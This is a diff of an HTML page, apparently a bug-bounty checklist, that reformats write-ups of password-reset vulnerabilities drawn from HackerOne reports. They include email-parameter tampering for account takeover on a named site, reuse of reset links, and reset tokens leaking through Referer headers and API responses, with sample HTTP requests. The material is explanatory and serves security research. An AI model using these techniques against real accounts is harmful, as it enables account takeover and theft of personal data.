-            <strong>Impact:</strong> An attacker can still change the password if the victim changes their email address. <a href="https://hackerone.com/reports/685007">More Info</a>
-        </div>
+                    <h5>Fourth Scenario:</h5>
+                    <ol>
+                        <li>Send the password reset link to your email.</li>
+                        <li>Don't open the password link; copy it and paste it into any editor.</li>
+                        <li>Open your account.</li>
+                        <li>Go to your account settings.</li>
+                        <li>Under account, find Account Overview.</li>
+                        <li>Go to the Email and Password option and change the email and verify it.</li>
+                        <li>After changing the email, go to the copied password reset link.</li>
+                        <li>Change your password.</li>
+                        <li>Your password has been changed.</li>
+                    </ol>
+                    <div class="impact">
+                        <strong>Impact:</strong> An attacker can still change the password if the victim changes their
+                        email address. <a href="https://hackerone.com/reports/685007">More Info</a>
+                    </div>
 
-        <h5>Fifth Scenario:</h5>
-        <ol>
-            <li>Attacker visits <a href="https://card.starbucks.com.sg/forgetPassword.php">https://card.starbucks.com.sg/forgetPassword.php</a> and enters their account's email.</li>
-            <li>The link is sent to the attacker's email inbox. The attacker clicks on the link while monitoring the request using Burp Suite.</li>
-            <li>The attacker then modifies the email parameter to the victim's email in the requests as shown in the images below.</li>
-            <li>Upon submitting the request, the victim's password will be changed to the desired password.</li>
-        </ol>
-        <div class="impact">
-            <strong>Impact:</strong> This attack does not require the victim to perform any actions and can lead to account takeover. The attacker can capture the session ID and potentially access the victim's personal information and Starbucks card. <a href="https://hackerone.com/reports/315879">More Info</a>
-        </div>
+                    <h5>Fifth Scenario:</h5>
+                    <ol>
+                        <li>Attacker visits <a
+                                href="https://card.starbucks.com.sg/forgetPassword.php">https://card.starbucks.com.sg/forgetPassword.php</a>
+                            and enters their account's email.</li>
+                        <li>The link is sent to the attacker's email inbox. The attacker clicks on the link while
+                            monitoring the request using Burp Suite.</li>
+                        <li>The attacker then modifies the email parameter to the victim's email in the requests as
+                            shown in the images below.</li>
+                        <li>Upon submitting the request, the victim's password will be changed to the desired password.
+                        </li>
+                    </ol>
+                    <div class="impact">
+                        <strong>Impact:</strong> This attack does not require the victim to perform any actions and can
+                        lead to account takeover. The attacker can capture the session ID and potentially access the
+                        victim's personal information and Starbucks card. <a
+                            href="https://hackerone.com/reports/315879">More Info</a>
+                    </div>
 
-        <h5>Sixth Scenario:</h5>
-        <ol>
-            <li>The web app sends a verification code to email before changing sensitive fields.</li>
-            <li>Intercept the request in Burp Suite and find the email parameter (e.g., email: victim@gmail.com) in the POST request.</li>
-            <li>Change the email to another email address (e.g., attacker@gmail.com).</li>
-            <li>Receive the verification code at the attacker's email address.</li>
-        </ol>
-        
-        <h4>2. Password Reset Token Leak via Referer</h4>
-        <ol>
-            <li>Go to <a href="https://ucp.nordvpn.com/lost-password">https://ucp.nordvpn.com/lost-password</a></li>
-            <li>Enter your email and click on Reset Password.</li>
-            <li>Go to your email and click on the password reset link.</li>
-            <li>On the password reset page, click on the social media links below and capture the request using Burp Suite.</li>
-            <li>Check if the Referer header is leaking the password reset token.</li>
-        </ol>
-        <pre>
+                    <h5>Sixth Scenario:</h5>
+                    <ol>
+                        <li>The web app sends a verification code to email before changing sensitive fields.</li>
+                        <li>Intercept the request in Burp Suite and find the email parameter (e.g., email:
+                            victim@gmail.com) in the POST request.</li>
+                        <li>Change the email to another email address (e.g., attacker@gmail.com).</li>
+                        <li>Receive the verification code at the attacker's email address.</li>
+                    </ol>
+
+                    <h4>2. Password Reset Token Leak via Referer</h4>
+                    <ol>
+                        <li>Go to <a
+                                href="https://ucp.nordvpn.com/lost-password">https://ucp.nordvpn.com/lost-password</a>
+                        </li>
+                        <li>Enter your email and click on Reset Password.</li>
+                        <li>Go to your email and click on the password reset link.</li>
+                        <li>On the password reset page, click on the social media links below and capture the request
+                            using Burp Suite.</li>
+                        <li>Check if the Referer header is leaking the password reset token.</li>
+                    </ol>
+                    <pre>
 GET /nordvpn/ HTTP/1.1
 Host: www.facebook.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
@@ -2231,17 +2725,19 @@ Referer: https://ucp.nordvpn.com/reset-password/7ac4b7c4654797e8f2a061676314b095
 Cookie: fr=1oATYBf0BJ0DXndaC.AWV1Ag1KKbwlzMPBUI8vUz2NaP0.BduttV.ZM.F3B.0.0.BdwUoa.AWWnaTR3; sb=Vdu6XRBcBVULAbruWmZbgfPF; datr=Vdu6Xar5xVM18qIAfGd61Mh3; c_user=100003539320116; xs=4%3AcaHYJilvx4Lkqg%3A2%3A1572948495%3A6163%3A4671
 Upgrade-Insecure-Requests: 1
         </pre>
-        <div class="impact">
-            <strong>Impact:</strong> If a user resets their password and then clicks on social media links, the Referer header may leak the password reset token, allowing an attacker to exploit this for CSRF attacks or account takeover. <a href="https://hackerone.com/reports/751581">More Info</a>
-        </div>
+                    <div class="impact">
+                        <strong>Impact:</strong> If a user resets their password and then clicks on social media links,
+                        the Referer header may leak the password reset token, allowing an attacker to exploit this for
+                        CSRF attacks or account takeover. <a href="https://hackerone.com/reports/751581">More Info</a>
+                    </div>
 
-        <h4>3. Password Reset Token Leak via Response</h4>
-        <ol>
-            <li>Send the password reset link request.</li>
-            <li>Intercept the response.</li>
-            <li>Check if the response includes the reset-password link.</li>
-        </ol>
-        <pre>
+                    <h4>3. Password Reset Token Leak via Response</h4>
+                    <ol>
+                        <li>Send the password reset link request.</li>
+                        <li>Intercept the response.</li>
+                        <li>Check if the response includes the reset-password link.</li>
+                    </ol>
+                    <pre>
 Request:
 POST /access/forgotPassword HTTP/1.1
 Host: api.xprogram.com
@@ -2256,7 +2752,7 @@ Connection: keep-alive
 
 {"email":"victim@example.com","locale":"en","g-recaptcha-response":"03AIIIH7w84lgFA..."}
         </pre>
-        <pre>
+                    <pre>
 Response:
 {
   "status": "success",
@@ -2266,127 +2762,33 @@ Response:
   }
 }
         </pre>
-        <div class="impact">
-            <strong>Impact:</strong> Leaking the reset token in the response could allow an attacker to access it directly and perform unauthorized actions on the user's account. <a href="https://hackerone.com/reports/931287">More Info</a>
-        </div>
+                    <div class="impact">
+                        <strong>Impact:</strong> Leaking the reset token in the response could allow an attacker to
+                        access it directly and perform unauthorized actions on the user's account. <a
+                            href="https://hackerone.com/reports/931287">More Info</a>
+                    </div>
 
-    </div>
-</div>
+                </div>
+            </div>
 
     </main>
+<script>
+        // Mobile Menu Toggle
+        const menuToggle = document.querySelector('.menu-toggle');
+        const navbar = document.querySelector('.navbar');
 
-    <script>
-        // Progress bar
-        window.onscroll = function() {
-            updateProgressBar();
-        };
-
-        function updateProgressBar() {
-            const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
-            const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
-            const scrolled = (winScroll / height) * 100;
-            document.getElementById("progressBar").style.width = scrolled + "%";
-        }
-
-        // Back to top button
-        const fab = document.getElementById('fab');
-        
-        fab.addEventListener('click', () => {
-            window.scrollTo({
-                top: 0,
-                behavior: 'smooth'
-            });
+        menuToggle.addEventListener('click', () => {
+            navbar.classList.toggle('active');
         });
 
-        // Show/hide button based on scroll position
-        window.addEventListener('scroll', () => {
-            if (window.pageYOffset > 300) {
-                fab.style.display = 'flex';
-            } else {
-                fab.style.display = 'none';
-            }
-        });
-
-        // Check all checkboxes in a category when category checkbox is clicked
-        document.querySelectorAll('.category h3 input[type="checkbox"]').forEach(categoryCheckbox => {
-            categoryCheckbox.addEventListener('change', function() {
-                const subCheckboxes = this.closest('.category').querySelectorAll('.subcategory input[type="checkbox"]');
-                subCheckboxes.forEach(checkbox => {
-                    checkbox.checked = this.checked;
-                });
-            });
-        });
-
-        // Update category checkbox when sub-checkboxes change
-        document.querySelectorAll('.subcategory input[type="checkbox"]').forEach(subCheckbox => {
-            subCheckbox.addEventListener('change', function() {
-                const categoryCheckbox = this.closest('.category').querySelector('h3 input[type="checkbox"]');
-                const subCheckboxes = this.closest('.category').querySelectorAll('.subcategory input[type="checkbox"]');
-                const checkedSubCheckboxes = this.closest('.category').querySelectorAll('.subcategory input[type="checkbox"]:checked');
-                
-                if (checkedSubCheckboxes.length === 0) {
-                    categoryCheckbox.checked = false;
-                    categoryCheckbox.indeterminate = false;
-                } else if (checkedSubCheckboxes.length === subCheckboxes.length) {
-                    categoryCheckbox.checked = true;
-                    categoryCheckbox.indeterminate = false;
-                } else {
-                    categoryCheckbox.checked = false;
-                    categoryCheckbox.indeterminate = true;
-                }
-            });
-        });
-
-        // Smooth scrolling for anchor links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                e.preventDefault();
-                document.querySelector(this.getAttribute('href')).scrollIntoView({
-                    behavior: 'smooth'
-                });
-            });
-        });
-
-        // Copy code blocks to clipboard
-        document.querySelectorAll('pre').forEach(pre => {
-            pre.addEventListener('click', function() {
-                const range = document.createRange();
-                range.selectNode(this);
-                window.getSelection().removeAllRanges();
-                window.getSelection().addRange(range);
-                document.execCommand('copy');
-                window.getSelection().removeAllRanges();
-                
-                // Show copied notification
-                const notification = document.createElement('div');
-                notification.textContent = 'Copied!';
-                notification.style.position = 'absolute';
-                notification.style.right = '10px';
-                notification.style.top = '10px';
-                notification.style.background = 'var(--primary-color)';
-                notification.style.color = 'white';
-                notification.style.padding = '2px 8px';
-                notification.style.borderRadius = '3px';
-                notification.style.fontSize = '0.8rem';
-                notification.style.opacity = '0';
-                notification.style.transition = 'opacity 0.3s';
-                
-                this.style.position = 'relative';
-                this.appendChild(notification);
-                
-                setTimeout(() => {
-                    notification.style.opacity = '1';
-                }, 10);
-                
-                setTimeout(() => {
-                    notification.style.opacity = '0';
-                    setTimeout(() => {
-                        notification.remove();
-                    }, 300);
-                }, 2000);
+        // Close menu when clicking on a link
+        const navLinks = document.querySelectorAll('.navbar a');
+        navLinks.forEach(link => {
+            link.addEventListener('click', () => {
+                navbar.classList.remove('active');
             });
         });
     </script>
-</body>
-</html>
+   </body>
 
+</html>
